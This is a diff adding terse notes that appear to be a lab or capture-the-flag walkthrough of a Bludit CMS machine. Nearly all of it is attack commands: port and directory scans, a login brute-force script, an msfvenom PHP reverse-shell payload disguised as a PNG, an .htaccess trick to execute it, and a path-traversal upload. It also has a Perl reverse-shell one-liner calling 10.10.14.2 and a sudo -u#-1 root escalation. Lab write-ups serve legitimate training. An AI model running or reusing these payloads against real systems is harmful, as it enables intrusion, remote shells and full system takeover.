@@ -1,0 +1,26 @@
+nmap -sVC  10.129.52.77  -p 1-60000 -Pn
+gobuster dir  -u http://10.129.52.204/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobuster.txt
+found the username in todo.txt
+./CrackBludit.py -l http://10.129.52.204/admin/login.php -u ./user.txt -p /home/qoo7972365/Desktop/rockyou.txt.txt
+found the passowrd RolandDeschain
+log in to web and searchrexploit bludit
+generator png from msfvenom
+msfvenom -p php/reverse_php LHOST=10.10.14.2 LPORT=4444 -f raw -b '"' > evil.png
+
+echo -e "<?php $(cat evil.png)" > evil.png
+echo "RewriteEngine off" > .htaccess
+echo "AddType application/x-httpd-php .png" >> .htaccess
+###upload evil.png
+python3 bludit_travel_dir.py
+###execute evil.png
+visit url + /bl-content/tmp/temp/evil.png
+get reverse shell
+found password in databases/user.php
+hash-identifier   faca404fd5c0a31cf1897b823c695c85cffeb98d
+
+###change shell
+perl -e 'use Socket;$i="10.10.14.2";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+su hugo
+###get root
+sudo -l
+sudo -u#-1 /bin/bash
